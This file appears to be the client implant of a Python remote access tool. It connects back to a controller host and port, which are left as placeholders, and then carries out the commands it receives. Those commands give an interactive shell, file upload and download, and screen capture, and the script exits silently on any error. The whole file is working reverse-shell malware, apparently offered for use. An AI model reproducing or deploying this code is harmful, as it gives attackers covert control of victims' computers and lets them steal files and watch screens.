#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2020/8/15 17:17

import os
import socket
from lib.dsSocket import *
from clientModule.screen import Screen
from clientModule.shell import Shell
from clientModule.fileOperation import FileOPT

def connect():
    host = "$HOST$"
    port = "$PORT$"
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    shell = Shell(client)
    while True:
        cmd = DShellRecv(client)
        if cmd == "shell":
            shell.shell()
        elif cmd[:6] == "upload":
            FileOPT(client, cmd).upload()
        elif cmd[:8] == "download":
            FileOPT(client, cmd).download()
        elif cmd == "screen":
            Screen(client)
        elif cmd in ["quit", "q", "exit"]:
            break
    client.shutdown(2)
    client.close()

if __name__ == "__main__":
    try:
        connect()
    except:
        os._exit(0)
